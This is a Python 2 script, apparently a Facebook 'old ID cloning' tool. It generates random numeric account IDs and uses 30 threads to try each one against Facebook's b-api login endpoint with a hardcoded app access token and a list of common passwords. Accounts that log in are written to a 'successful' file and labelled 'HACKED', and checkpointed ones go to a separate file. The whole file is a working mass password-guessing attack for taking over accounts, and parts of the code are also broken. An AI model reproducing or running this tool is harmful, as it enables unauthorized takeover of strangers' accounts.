
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(30000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')

try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 Old.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3.0 / 200)


def tik():
    titik = [
     '   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print '\r\x1b[1;91m     [<<>>] \x1b[1;92mWait TOOL Run\x1b[1;90ming \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.5)


back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')

logo1 = """
 _____ _     _   _____                _    
|  _  | |   | | /  __ \              | |   
| | | | | __| | | /  \/_ __ __ _  ___| | __
| | | | |/ _` | | |   | '__/ _` |/ __| |/ /
\ \_/ / | (_| | | \__/\ | | (_| | (__|   < 
 \___/|_|\__,_|  \____/_|  \__,_|\___|_|\_\
                                           
 > DEVELOPER     : HAMID MEER
 > FACEBOOK ID   : HAMID MEER'HAMII
 > WHATSAPP      : +923155912839
 > YOUTUBE       : HAMII WORLD
 > WARNING       : DON'T USE FOR ILLEGAL WORK        
 <=><=><=><=><=><=><=><=><=><=><=><=><=>
"""
print logo1
CorrectUsername = 'KING'
CorrectPassword = 'HAMII'
loop = 'true'
while loop == 'true':
    username = raw_input('\x1b[1;92m \x1b[1;94mUSERNAME \x1b[1;92m:\x1b[1;92m\n        ')
    if username == CorrectUsername:
        password = raw_input('\x1b[1;92m \x1b[1;93mPASSWORD \x1b[1;92m:\x1b[1;92m   \n     ')
        if password == CorrectPassword:
            print 
            jalan (' WELCOME TO HAMII WORLD ')
            time.sleep(1)
            loop = 'false'
        else:
            print '\x1b[1;93mWRONG PASSWORD'
            os.system('xdg-open https://www.facebook.com/H4CK3R.H4M11')
    else:
        print '\x1b[1;93mWRONG USERNAME'
        os.system('xdg-open  https://www.facebook.com/H4CK3R.H4M11')

def lisensi():
    os.system('clear')
    login()


def login():
    os.system('clear')
    print logo1
    print 
    
    jalan ('\x1b[1;94m===========================================\n')
    print '\x1b[1;97m[1] CLONE FACEBOOK 2009-10'
    print '\x1b[1;97m[2] CLONE FACEBOOK 2008-09'
    print '\x1b[1;97m[3] CLONE FACEBOOK 2006-07'
    print '\x1b[1;97m[4] CLONE FACEBOOK 2004-06'
    print '\x1b[1;97m[5] FACEBOOK ID '
    print '\x1b[1;97m(0) Back'
    print 
    jalan ('\x1b[1;94m===========================================')
    pilih_hamii()


def pilih_hamii():
    hamii = raw_input('\n\x1b[1;95m\xe2\x80\xa2\xe2\x9e\xa2 \x1b[1;96m')
    if hamii == '':
        print '\x1b[1;96mFill In Correctly'
        pilih_login()
    elif hamii == '1':
        p()
    elif hamii == '2':
        b()
    elif hamii == '3':
    	os.system('clear')
        print
        jalan('NEED UR SUPPORT ')
    elif hamii == '4':
        os.system('xdg-open  https://www.facebook.com/H4CK3R.H4M11')
        print("PLZ FOLLOW ME ON FACEBOOK ")
    elif hamii == '5':
        os.system('xdg-open  https://www.facebook.com/H4CK3R.H4M11')
    else:
        print 'Fill In Correctly'


def p():
    os.system('clear')
    print logo1
    print
    print
    print 
    jalan('Do you want countinue [y/n]')
    act()


def act():
    hamii = raw_input('\n\n \x1b[1;97m  ')
    if hamii == '':
        print '[!] Fill in correctly'
        act()
    elif hamii == 'y':
        tik()
        os.system('clear')
        print logo1
        print
        print '\x1b[1;93mTYPE ANY TWO CODE'
        print '\n'
        print
        try:
            c = raw_input('>>> ')
            k = '100000'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            hamii()

    elif hamii == 'n':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 47 * '\x1b[1;93m-'
    xxx = str(len(id))
    jalan('\x1b[1;96m TOTAL IDS NUMBER : ' + xxx)
    jalan('\x1b[1;96m WAIT FOR OLD. IDZ CLONE ')
    jalan('\x1b[1;93m TO STOP THIS PROCESS PRESS Ctrl THEN z')
    print 47 * '\x1b[1;93m-'

    def main(arg):
        global cpb
        global oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = '123456'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m   (HAMII-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass1
                okb = open('sdcard/ids/successful.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;92m   (HAMII-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass1
                cps = open('sdcard/ids/checkpoint.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '123456789'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;93m   (HAMII-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass2
                    okb = open('sdcard/ids/successful.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;92m   (HAMII-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass2
                    cps = open('sdcard/ids/checkpoint.txt', 'a')
                    cps.write(k + c + user + pass3 + '\n')
                    cps.close()
                    cpb.append(c + user + pass3)
                else:
                    pass3 = '@@123@@'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m   (HAMII-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass3
                        okb = open('sdcard/ids/successful.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;92m   (HAMII-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass3
                        cps = open('sdcard/ids/checkpoint.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = '12345678'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;93m   (HAMII-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass4
                            okb = open('sdcard/ids/successful.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;92m   (HAMII-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass4
                            cps = open('sdcard/ids/checkpoint.txt', 'a')
                            cps.write(k + c + user + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                        else:
                            pass5 = '1234567'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m   (HAMII-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass5
                                okb = open('sdcard/ids/successful.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;92m   (HAMII-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass5
                                cps = open('sdcard/ids/checkpoint.txt', 'a')
                                cps.write(k + c + user + pass5 + '\n')
                                cps.close()
                                cpb.append(c + user + pass5)
                            else:
                                pass6 = '112233'
                                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;93m   (RaYes-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass6
                                    okb = open('sdcard/ids/successful.txt', 'a')
                                    okb.write(k + c + user + pass6 + '\n')
                                    okb.close()
                                    oks.append(c + user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;92m   (HAMII-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass6
                                    cps = open('sdcard/ids/checkpoint.txt', 'a')
                                    cps.write(k + c + user + pass6 + '\n')
                                    cps.close()
                                    cpb.append(c + user + pass6)
                                else:
                                    pass7 = '786786'
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;93m   (HAMII-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass7
                                        okb = open('sdcard/ids/successful.txt', 'a')
                                        okb.write(k + c + user + pass7 + '\n')
                                        okb.close()
                                        oks.append(c + user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;92m   (HAMII-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass7
                                        cps = open('sdcard/ids/checkpoint.txt', 'a')
                                        cps.write(k + c + user + pass7 + '\n')
                                        cps.close()
                                        cpb.append(c + user + pass7)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '\x1b[1;91m-'
    print 'Process Has Been Completed ...'
    raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
    login()


def b():
    os.system('clear')
    print logo1
    print
    print
    print 'Do you want countinue [y/n]'
    action()


def action():
    hamii = raw_input('\n\n \x1b[1;97m  ')
    if hamii == '':
        print '[!] Fill in correctly'
        action()
    elif hamii == 'y':
        tik()
        os.system('clear')
        print logo1
        print
        try:
            c = raw_input('TYPE ANY 1 DIGIT NUMBER >>>')
            k = '1000000'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            khalid()

    elif hamii == 'n':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 47 * '\x1b[1;93m-'
    xxx = str(len(id))
    jalan('\x1b[1;96m TOTAL IDS NUMBER : ' + xxx)
    jalan('\x1b[1;93m TO STOP THIS PROCESS PRESS Ctrl THEN z')
    print 47 * '\x1b[1;93m-'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = '123456'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m   (HAMII-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass1
                okb = open('sdcard/ids/successful.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;92m   (HAMII-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass1
                cps = open('sdcard/ids/checkpoint.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '123456789'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;93m   (HAMII-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass2
                    okb = open('sdcard/ids/successful.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;92m   (HAMII-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass2
                    cps = open('sdcard/ids/checkpoint.txt', 'a')
                    cps.write(k + c + user + pass3 + '\n')
                    cps.close()
                    cpb.append(c + user + pass3)
                else:
                    pass3 = '@@123@@'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m   (HAMII-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass3
                        okb = open('sdcard/ids/successful.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;92m   (HAMII-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass3
                        cps = open('sdcard/ids/checkpoint.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = '12345678'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;93m   (HAMII-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass4
                            okb = open('sdcard/ids/successful.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;92m   (HAMII-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass4
                            cps = open('sdcard/ids/checkpoint.txt', 'a')
                            cps.write(k + c + user + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                        else:
                            pass5 = '1234567'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m   (HAMII-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass5
                                okb = open('sdcard/ids/successful.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;92m   (HAMII-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass5
                                cps = open('sdcard/ids/checkpoint.txt', 'a')
                                cps.write(k + c + user + pass5 + '\n')
                                cps.close()
                                cpb.append(c + user + pass5)
                            else:
                                pass6 = '112233'
                                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;93m   (HAMII-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass6
                                    okb = open('sdcard/ids/successful.txt', 'a')
                                    okb.write(k + c + user + pass6 + '\n')
                                    okb.close()
                                    oks.append(c + user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;92m   (HAMII-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass6
                                    cps = open('sdcard/ids/checkpoint.txt', 'a')
                                    cps.write(k + c + user + pass6 + '\n')
                                    cps.close()
                                    cpb.append(c + user + pass6)
                                else:
                                    pass7 = '786786'
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;93m   (HAMII-HAC\x1b[1;92mKED)\x1b[1;91m \xe2\x97\x8f  \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;95m' + pass7
                                        okb = open('sdcard/ids/successful.txt', 'a')
                                        okb.write(k + c + user + pass7 + '\n')
                                        okb.close()
                                        oks.append(c + user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;92m   (HAMII-\x1b[1;97mCP\x1b[1;93m)\x1b[1;91m \xe2\x97\x8f \x1b[1;97m' + k + c + user + '\x1b[1;91m \xe2\x97\x8f \x1b[1;96m ' + pass7
                                        cps = open('sdcard/ids/checkpoint.txt', 'a')
                                        cps.write(k + c + user + pass7 + '\n')
                                        cps.close()
                                        cpb.append(c + user + pass7)
                                        
        except:
            pass


    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '\x1b[1;91m-'
    print 'Process Has Been Completed ...'
    print ' cp IDs after 7 days'
    print 'Total Hacked/CP Accounts : ' + str(len(oks)) + '/' + str(len(cpb))
    raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
    login()


if __name__ == '__main__':
    os.system('git pull')
    login()


